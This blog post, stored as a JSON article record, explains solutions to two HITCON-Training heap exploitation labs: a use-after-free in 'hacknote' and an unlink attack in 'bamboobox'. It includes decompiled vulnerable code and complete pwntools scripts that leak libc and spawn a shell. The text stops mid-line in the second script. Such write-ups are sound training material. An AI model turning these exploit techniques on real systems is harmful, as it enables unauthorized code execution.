{"title":"HITCON_training题解(二)","slug":"HITCON-training-2","date":"2019-04-10T06:47:59.000Z","updated":"2019-09-21T08:33:50.169Z","comments":true,"path":"api/articles/HITCON-training-2.json","photos":[],"link":"","excerpt":"Lab10——hacknote防护可以看到本题开启了canary和nx，这时想在栈上进行利用就相当困难了。1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab10$ checksec hacknote<br>[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab10/hacknote&apos;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br>分析本题是一道典型的堆菜单题，共有4个选项1<br>2<br>3<br>4<br>1. Add note          <br>2. Delete note       <br>3. Print note        <br>4. Exit<br>","covers":null,"content":"<h2 id=\"Lab10——hacknote\"><a href=\"#Lab10——hacknote\" class=\"headerlink\" title=\"Lab10——hacknote\"></a>Lab10——hacknote</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>可以看到本题开启了canary和nx，这时想在栈上进行利用就相当困难了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab10$ checksec hacknote</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab10/hacknote&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>本题是一道典型的堆菜单题，共有4个选项</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. Add note          </span><br><span class=\"line\">2. Delete note       </span><br><span class=\"line\">3. Print note        </span><br><span class=\"line\">4. Exit</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h4 id=\"add-note\"><a href=\"#add-note\" class=\"headerlink\" title=\"add note\"></a>add note</h4><p>逆向可以得到note的结构如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct note&#123;</span><br><span class=\"line\">\tDWORD *funcptr;</span><br><span class=\"line\">\tDWORD *content;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>每次执行add note操作会malloc两个chunk，首先会malloc(0x8)存储note结构体，将指针存在bss段的全局指针数组notelist；然后会根据输入的size，malloc(size)的chunk，并向其中读入size大小的数据。一个指向print_note_content函数的函数指针funcptr和指向存储数据的chunk的指针content会被存储在note结构体中。</p>\n<h4 id=\"del-note\"><a href=\"#del-note\" class=\"headerlink\" title=\"del note\"></a>del note</h4><p>首先读入符合要求的index，如果相应的数组项不为NULL，就会<em>依次free掉存储content的chunk和存储note的chunk</em>。注意这里存在UAF漏洞，并没有将notelist上存储的指向note的野指针置为NULL，所以即使在free后我们也可以任意的对这些指针进行解引用。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> <span class=\"title\">del_note</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [esp+4h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+8h] [ebp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v3; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Index :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  v1 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt;= count )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Out of bound!\"</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( notelist[v1] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"keyword\">void</span> **)notelist[v1] + <span class=\"number\">1</span>)); &lt;= uaf vul</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(notelist[v1]);\t\t\t\t\t\t\t\t\t&lt;= uaf vul</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Success\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"print-note\"><a href=\"#print-note\" class=\"headerlink\" title=\"print note\"></a>print note</h4><p>该功能中会调用note结构体中存储的print_note_content函数指针，打印出content的内容。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( notelist[v1] )</span><br><span class=\"line\">  (*(<span class=\"keyword\">void</span> (__cdecl **)(<span class=\"keyword\">void</span> *))notelist[v1])(notelist[v1]);</span><br><span class=\"line\"><span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v3;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">print_note_content</span><span class=\"params\">(<span class=\"keyword\">int</span> a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(*(<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **)(a1 + <span class=\"number\">4</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>实际上，该题中预留了一个magic函数，直接劫持函数指针到magic函数就可以实现利用。为了实现劫持，我们需要构造一个类型混淆的效果，即能够向note结构体里写内容。因为我们只能向content结构体写，所以我们需要利用uaf漏洞构造一个类似的效果。</p>\n<p>首先malloc两个size为0x10的note，然后del掉index0的chunk，此时size为0x8的fastbin中有两个chunk，size为0x10的fastbin中有两个chunk。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fd -&gt; note2(chunk2)-&gt;note(chunk0)</span><br><span class=\"line\">fd -&gt; content2(chunk3) -&gt; content(chunk1)</span><br></pre></td></tr></table></figure>\n<p>然后再malloc一个size为0x8的note，就会将两个size为0x8的chunk从fastbin上取下来，而chunk0则作为index2的content，也就是index0的note。所以我们就可以通过向index2的content中写来修改index0的note，也就可以劫持函数指针了。</p>\n<p>利用代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">magic = <span class=\"number\">0x8048986</span></span><br><span class=\"line\">add(<span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(magic) + p32(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">add(payload)</span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"提高\"><a href=\"#提高\" class=\"headerlink\" title=\"提高\"></a>提高</h3><p>我们给该题加大难度，假设不存在magic函数，或者说我们想要直接RCE执行任意指令，那应该怎么办呢？</p>\n<p>第一步应该是leak libc，我们可以利用和上述类似的思路，将函数指针覆盖为原来的print_note_content函数，将content覆盖为got表的指针，从而leak出got表。</p>\n<p>第二步是将函数指针覆盖为system，将content覆盖为/bin/sh，然后getshell。</p>\n<p>这里有两个难点：</p>\n<ul>\n<li>因为这道菜单题没有edit函数，所以我们可以直接free掉那两个0x8的chunk然后在重新申请的时候布置堆块内容即可。</li>\n<li>如果直接输入/bin/sh，由于前面有一些杂乱的数据，会使得shell命令执行失败。我们可以用”||”或者”;”截断，然后直接用sh即可。因为有些环境中，/bin本来就在环境变量中，所以直接用sh也可以。这里如果用<code>;/bin/sh\\x00</code>，就会超过8个byte，所以我们只能用<code>;sh\\x00</code>碰碰运气。幸运的是，我们成功了。</li>\n</ul>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./hacknote\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./hacknote\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"size :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(len(content)))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Content :\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">del_note</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">print_note</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">print_ = <span class=\"number\">0x804865b</span></span><br><span class=\"line\">got = elf.got[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">add(<span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(print_) + p32(got)</span><br><span class=\"line\">add(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u32(p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">del_note(<span class=\"number\">2</span>)</span><br><span class=\"line\">payload = p32(system) + <span class=\"string\">\";sh\\x00\"</span></span><br><span class=\"line\">add(payload)</span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab11——Bamboobox\"><a href=\"#Lab11——Bamboobox\" class=\"headerlink\" title=\"Lab11——Bamboobox\"></a>Lab11——Bamboobox</h2><h3 id=\"防护-1\"><a href=\"#防护-1\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>该题终于是一道64位的题了，仍旧开启了canary和nx，没有开启pie。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab11$ checksec bamboobox</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab11/bamboobox&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>仍旧是标准菜单题，该题有五个功能，即增删改查和退出。</p>\n<p>该题漏洞位于change_item函数中：</p>\n<p>虽然在申请chunk的时候是根据输入的size进行malloc操作，但并没有存储size，所以在change的时候未对size进行校验，而是根据此次指定的长度对堆进行写入，也就是存在一个潜在的堆任意写漏洞。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">change_item</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v0; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+4h] [rbp-2Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [rsp+10h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> nptr; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( num )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter the index of item:\"</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">8u</span>LL);</span><br><span class=\"line\">    v2 = atoi(&amp;buf);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(_QWORD *)&amp;itemlist[<span class=\"number\">4</span> * v2 + <span class=\"number\">2</span>] )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter the length of item name:\"</span>, &amp;buf);</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, &amp;nptr, <span class=\"number\">8u</span>LL);</span><br><span class=\"line\">      v0 = atoi(&amp;nptr);</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter the new name of the item:\"</span>, &amp;nptr);</span><br><span class=\"line\">      *(_BYTE *)(*(_QWORD *)&amp;itemlist[<span class=\"number\">4</span> * v2 + <span class=\"number\">2</span>] + (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)read(<span class=\"number\">0</span>, *(<span class=\"keyword\">void</span> **)&amp;itemlist[<span class=\"number\">4</span> * v2 + <span class=\"number\">2</span>], v0)) = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"invaild index\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"No item in the box\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v5;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>该题也是采用全局变量管理堆块指针，将申请chunk的size和对应指针依次存放在bss段。也就是说，如果我们能够修改bss段的指向chunk的指针为任意地址，我们也就可以利用show和edit函数实现任意地址读写。</p>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>根据上述分析，要实现bss段修改，结合该题的堆溢出漏洞，构造一个unlink利用来使得bss段上的chunk指针向前移动0x18个byte，然后修改chunk指针，实现任意地址读写，从而leak处libc，再劫持atoi@got（malloc_hook和free_hook似乎也可以）为one_gadget从而getshell。</p>\n<p>注意unlink利用有如下要点：</p>\n<ul>\n<li>需要在free时触发前向或后向合并，条件有：<ul>\n<li>free的堆块位于unsorted bin范围内（64位最小为0x80）</li>\n<li>free的堆块的前一个或后一个堆块未被使用（被free），这根据当前chunk的prev_inuse位判断，并且需要构造prev_size，在当前chunk的地址 - prev_size的位置布置一个fake chunk</li>\n<li>fake chunk需要保证fake chunk的next chunk的prev_size和自己的size相同</li>\n</ul>\n</li>\n<li>野指针需要指向被合并的fake chunk的user_data区间，然后从user_data部分开始构造fake chunk</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./bamboobox\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./bamboobox\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, name)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index, size, name)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">'3'</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.send(name)</span><br><span class=\"line\">itemlist = <span class=\"number\">0x6020c0</span></span><br><span class=\"line\">one_gadget = <span class=\"number\">0xf02a4</span></span><br><span class=\"line\"></span><br><span class=\"line\">ptr = itemlist + <span class=\"number\">0x8</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"c\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x61</span>) + p64(ptr - <span class=\"number\">0x18</span>) + p64(ptr - <span class=\"number\">0x10</span>)</span><br><span class=\"line\">payload += (<span class=\"number\">0x60</span> - <span class=\"number\">0x20</span>) * <span class=\"string\">\"a\"</span> + p64(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0xa0</span>) + p64(<span class=\"number\">0x90</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\"><span class=\"comment\"># now ptr = 0x6020b0</span></span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>) * <span class=\"number\">2</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) + p64(atoi_got)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload = 